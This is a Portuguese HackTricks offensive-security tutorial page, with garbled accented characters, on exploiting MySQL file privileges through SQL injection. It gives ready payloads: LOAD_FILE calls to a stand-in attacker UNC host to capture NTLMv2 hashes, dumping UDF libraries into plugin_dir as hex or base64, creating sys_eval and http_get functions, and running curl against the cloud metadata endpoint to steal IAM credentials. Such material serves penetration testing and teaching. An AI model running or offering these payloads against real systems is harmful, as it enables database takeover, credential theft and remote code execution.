# MySQL File priv para SSRF/RCE

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML para SSRF

Todo artigo sobre exfiltra√ß√£o de dados Out of Band via SQL usar√° a fun√ß√£o de string `LOAD_FILE()` para fazer uma requisi√ß√£o de rede. A fun√ß√£o em si tem suas pr√≥prias limita√ß√µes baseadas no sistema operacional em que √© executada e nas configura√ß√µes com as quais o banco de dados foi iniciado.

Por exemplo, se a vari√°vel global `secure_file_priv` n√£o foi definida, o [valor padr√£o √© definido como `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), o que significa que voc√™ s√≥ pode usar fun√ß√µes como `LOAD_FILE('filename')` ou `LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename` para ler arquivos do diret√≥rio `/var/lib/mysql-files/`. Para poder realizar leituras em arquivos fora deste diret√≥rio, a op√ß√£o `secure_file_priv` tem que ser definida como `""`, o que s√≥ pode ser feito atualizando o arquivo de configura√ß√£o do banco de dados ou passando o par√¢metro de inicializa√ß√£o `--secure_file_priv=""` para o servi√ßo do banco de dados.

No entanto, sob circunst√¢ncias em que `secure_file_priv` est√° definido como `""`, dever√≠amos ser capazes de ler outros arquivos no sistema, assumindo permiss√µes de leitura de arquivos e `file_priv` definido como `Y` em `mysql.user` para o usu√°rio atual do banco de dados. No entanto, a capacidade de usar essas fun√ß√µes para fazer chamadas de rede √© muito dependente do sistema operacional. Como essas fun√ß√µes s√£o constru√≠das apenas para ler arquivos, as √∫nicas chamadas de rede relevantes que podem ser feitas s√£o para caminhos UNC em hosts Windows, j√° que a [API `CreateFileA` do Windows que √© chamada ao acessar um arquivo entende as conven√ß√µes de nomenclatura UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Ent√£o, se o banco de dados alvo estiver rodando em uma m√°quina Windows, a query de inje√ß√£o `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` resultaria [na m√°quina Windows enviando hashes NTLMv2 em uma tentativa de autenticar com o servidor controlado pelo atacante `\\attackerserver.example.com`](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html).

Este Server Side Request Forgery, embora √∫til, √© restrito apenas √† porta TCP 445. Voc√™ n√£o pode controlar o n√∫mero da porta, mas pode ler informa√ß√µes de compartilhamentos configurados com privil√©gios de leitura completos. Al√©m disso, como mostrado em pesquisas mais antigas, voc√™ pode usar essa capacidade limitada de SSRF para roubar hashes e retransmiti-los para obter shells, ent√£o √© definitivamente √∫til.

### Fun√ß√µes Definidas pelo Usu√°rio para RCE

Outra t√©cnica interessante com bancos de dados MySQL √© a capacidade de usar Fun√ß√µes Definidas pelo Usu√°rio (UDF) presentes em arquivos de biblioteca externos que, se presentes em locais espec√≠ficos ou no $PATH do sistema, podem ser acessadas de dentro do MySQL.

Voc√™ poderia usar uma SQL Injection para **escrever uma biblioteca (`.so` ou `.dll`** dependendo de Linux ou Windows), contendo uma Fun√ß√£o Definida pelo Usu√°rio que pode fazer requisi√ß√µes de rede/HTTP, que pode ser ent√£o invocada atrav√©s de consultas adicionais.

Isso tem seu pr√≥prio conjunto de restri√ß√µes. Baseado na vers√£o do MySQL, que voc√™ pode identificar com `select @@version`, o diret√≥rio de onde os plugins podem ser carregados √© restrito. MySQL abaixo de `v5.0.67` permitia que arquivos de biblioteca fossem carregados do caminho do sistema se a vari√°vel `plugin_dir` n√£o fosse definida. Isso mudou agora e as vers√µes mais recentes t√™m a vari√°vel **`plugin_dir`** definida para algo como `/usr/lib/mysql/plugin/`, que geralmente √© de propriedade do root.

Basicamente **para voc√™ carregar uma biblioteca personalizada no MySQL e chamar uma fun√ß√£o da biblioteca carregada via SQL Injection, voc√™ precisaria**:

* capacidade de **escrever no local** especificado em **`@@plugin_dir`** via SQL Injection
* **`file_priv`** definido como **`Y`** em `mysql.user` para o usu√°rio atual do banco de dados
* **`secure_file_priv`** definido como **`""`** para que voc√™ possa ler os bytes brutos da biblioteca de um local arbitr√°rio como a rede ou um diret√≥rio de uploads de arquivos em uma aplica√ß√£o web.

Assumindo que as condi√ß√µes acima sejam atendidas, voc√™ pode usar a **abordagem cl√°ssica de transferir a** [**popular biblioteca UDF do MySQL `lib_mysqludf_sys`**](https://github.com/mysqludf/lib\_mysqludf\_sys) **para o servidor do banco de dados**. Voc√™ ent√£o seria capaz de fazer solicita√ß√µes de comandos do sistema operacional como `cURL` ou `powershell wget` para realizar SSRF usando a sintaxe

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

H√° muitas outras fun√ß√µes declaradas nesta biblioteca, uma an√°lise das quais pode ser vista [aqui](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). Se voc√™ √© pregui√ßoso como eu, pode pegar uma c√≥pia desta biblioteca UDF, para o sistema operacional alvo, de uma instala√ß√£o do metasploit do diret√≥rio `/usr/share/metasploit-framework/data/exploits/mysql/` e come√ßar.

Alternativamente, bibliotecas UDF foram criadas especificamente para fornecer ao banco de dados a capacidade de fazer requisi√ß√µes HTTP. Voc√™ pode usar [MySQL User-defined function (UDF) para HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) para fazer o banco de dados realizar requisi√ß√µes HTTP, usando a seguinte sintaxe

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Voc√™ tamb√©m pode [criar sua pr√≥pria UDF e us√°-la para p√≥s-explora√ß√£o tamb√©m.](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

De qualquer forma, voc√™ precisa transferir a biblioteca para o servidor do banco de dados. Voc√™ pode fazer isso de v√°rias maneiras

1. Use a fun√ß√£o de string `hex()` do MySQL ou algo como `xxd -p filename.so | tr -d '\n'` para converter o conte√∫do da biblioteca para formato hexadecimal e depois despej√°-lo no diret√≥rio `@@plugin_dir` usando `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternativamente, converta o conte√∫do de `filename.so` para base64 e use `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

Se o `@@plugin_dir` n√£o for grav√°vel, ent√£o voc√™ est√° sem sorte se a vers√£o for acima de `v5.0.67`. Caso contr√°rio, escreva em um local diferente que esteja no caminho e carregue a biblioteca UDF de l√° usando

* para a biblioteca `lib_mysqludf_sys` - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* para a biblioteca `mysql-udf-http` - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`


Para automatizar isso, voc√™ pode usar o SQLMap que suporta [o uso de UDF personalizado atrav√©s da op√ß√£o `--udf-inject`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Para SQL Injections cegos, voc√™ poderia redirecionar a sa√≠da das fun√ß√µes UDF para uma tabela tempor√°ria e depois ler os dados de l√° ou usar [requisi√ß√£o DNS contrabandeada dentro de um comando `sys_eval` ou `sys_exec` curl](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
